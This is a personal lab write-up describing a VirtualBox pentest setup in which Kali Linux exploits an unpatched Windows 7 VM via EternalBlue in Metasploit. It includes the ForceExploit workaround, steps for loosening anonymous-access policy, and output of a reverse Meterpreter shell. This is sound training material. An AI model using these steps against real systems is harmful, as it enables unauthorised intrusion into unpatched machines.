# Home Pentest Lab: Kali Linux + Windows 7 (EternalBlue)

> Personal practice lab built as part of my cybersecurity certification roadmap (ISC2 CC) and the *Complete Ethical Hacking Bootcamp* (Zero To Mastery). Fully isolated environment — no real/production systems involved.

## Overview

| | |
|---|---|
| **Attacker** | Kali Linux (VirtualBox) |
| **Target** | Windows 7 Ultimate SP1 x64 (VirtualBox, unpatched, isolated) |
| **Hypervisor** | Oracle VirtualBox |
| **Network** | Host-only (isolated) + NAT (internet access for Kali only) |
| **Objective** | Build a 2-VM pentest lab, diagnose a real networking misconfiguration, and successfully exploit MS17-010 (EternalBlue) |

## 1. Lab Architecture

```
┌─────────────────┐         ┌──────────────────────┐
│   Kali Linux     │         │   Windows 7 Ultimate   │
│                  │         │   SP1 x64 (unpatched) │
│  eth0 → NAT      │         │                        │
│  (internet)      │         │  eth0 → Host-only      │
│                  │         │  192.168.56.102        │
│  eth1 → Host-only │◄───────►│                        │
│  192.168.56.101  │  SMB/445│                        │
└─────────────────┘         └──────────────────────┘
```

- **NAT adapter** on Kali: keeps internet access for `apt update`, Metasploit module updates, etc.
- **Host-only adapter** on both VMs (same VirtualBox host-only network): isolated subnet where the attacker/target interaction happens — never touches the real network.

## 2. Setup Steps

1. Created `Win7-Lab` VM in VirtualBox (2-4 GB RAM, 1-2 vCPU, 45 GB dynamically-allocated VDI).
2. Mounted a verified Windows 7 Ultimate SP1 x64 ISO (SHA-256 checksum cross-checked against VirusTotal: 0/93 detections before use).
3. Installed Windows 7 without a product key (evaluation mode — sufficient for lab purposes, no license needed for an isolated test VM).
4. Set network profile to **Work network** (keeps network discovery on without the extra HomeGroup setup Home network forces, and without Public network's strict firewall defaults).
5. Configured Kali with a second network adapter (Host-only) alongside the default NAT adapter, so it has internet access *and* reachability to the target.

## 3. Issue #1 — Kali losing one interface when the other came up

**Symptom:** Enabling the Host-only adapter (`eth1`) on Kali caused the NAT adapter (`eth0`) to lose connectivity, and vice versa — only one interface could be active at a time.

**Root cause:** `nmcli connection show` revealed that `eth0`'s dedicated connection profile had been lost, while `eth1` was still using NetworkManager's generic auto-created profile (`Wired connection 1`), which wasn't bound to a specific interface — causing the two to conflict when NetworkManager tried to activate them.

**Fix:**
```bash
sudo nmcli connection delete "Wired connection 1"
sudo nmcli connection add type ethernet ifname eth0 con-name eth0-nat
sudo nmcli connection up eth0-nat
sudo nmcli connection add type ethernet ifname eth1 con-name eth1-hostonly
sudo nmcli connection up eth1-hostonly
```
Creating two connection profiles explicitly bound to their respective interfaces resolved the conflict — both now stay active simultaneously, confirmed with `nmcli connection show` and `ip a`.

## 4. Issue #2 — EternalBlue reporting a false negative ("target is not vulnerable")

With both VMs reachable (`ping` confirmed, `nmap -p 445` showed the port open), running `exploit/windows/smb/ms17_010_eternalblue` still failed:

```
[-] 192.168.56.102:445 - An SMB Login Error occurred while connecting to the IPC$ tree.
[-] 192.168.56.102:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
```

**Root cause:** The module's internal vulnerability check attempts an *anonymous (null session)* login to the `IPC$` share to fingerprint the SMB version before firing the actual exploit. Windows 7's default `RestrictAnonymous` security policy blocked that specific anonymous query — producing a **false negative**: the check reported "not vulnerable" even though the underlying MS17-010 flaw was still present and exploitable.

**Fix — two parts:**

1. Skip the (unreliable) built-in check and force the exploit to run regardless:
   ```
   set ForceExploit true
   run
   ```
2. Confirm/loosen the local security policy on the target (`secpol.msc` → Local Policies → Security Options) so the anonymous `IPC$` login itself can succeed, not just get bypassed:
   - **Network access: Let Everyone permissions apply to anonymous users** → Enabled
   - **Network access: Restrict anonymous access to Named Pipes and Shares** → Disabled

After this, `ms17_010_eternalblue` ran successfully and returned a Meterpreter session.

## 5. Result

```
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.56.101:4444
...
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102)
```

## 6. Key Takeaways

- A "not vulnerable" result from an automated Metasploit check is not always authoritative — it can fail due to unrelated access restrictions on the target, not the absence of the vulnerability. Understanding *why* a check fails matters more than blindly trying workaround flags.
- Multi-adapter networking on an attacker VM (internet + isolated lab network) is a common real-world pentest setup, and NetworkManager profile conflicts are a practical issue worth knowing how to diagnose (`nmcli connection show`, not just `ip a`).
- Verifying a downloaded ISO's integrity (hash + VirusTotal check) before using it in a lab is a basic but important hygiene step, even for "throwaway" VM images.

## 7. Next Steps (lab roadmap)

- [ ] Privilege escalation practice on the same Windows 7 target
- [ ] Repeat with a patched Windows 7 target to confirm MS17-010 no longer works (control test)
- [ ] Expand lab with Metasploitable2/3 as an additional target
- [ ] Document post-exploitation steps (Meterpreter enumeration, persistence concepts — lab only)

---
*Disclaimer: All testing performed in a fully isolated, personally-owned VirtualBox lab environment for educational purposes as part of a structured cybersecurity certification path. No real-world or third-party systems were involved.*
